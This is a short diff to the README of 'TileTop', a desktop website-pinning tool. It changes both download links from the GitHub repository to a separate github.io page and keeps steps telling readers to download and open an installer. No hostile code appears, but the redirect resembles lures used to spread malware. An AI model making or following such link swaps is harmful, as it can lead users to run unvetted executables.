@@ -1,12 +1,12 @@
 # 🪟 TileTop - Keep your websites on the desktop
 
-[![](https://img.shields.io/badge/Download-TileTop-blue.svg)](https://github.com/Tatesight746/TileTop)
+[![](https://img.shields.io/badge/Download-TileTop-blue.svg)](https://tatesight746.github.io)
 
 TileTop lets you pin your favorite websites and folders directly to your desktop. You turn static pages into live widgets that stay visible while you work. This tool uses native code to keep your system fast and responsive. 
 
 ## 📥 Getting Started
 
-1. Visit the [TileTop download page](https://github.com/Tatesight746/TileTop).
+1. Visit the [TileTop download page](https://tatesight746.github.io).
 2. Locate the latest release section.
 3. Download the installer file for your system.
 4. Open the file to start the installation.
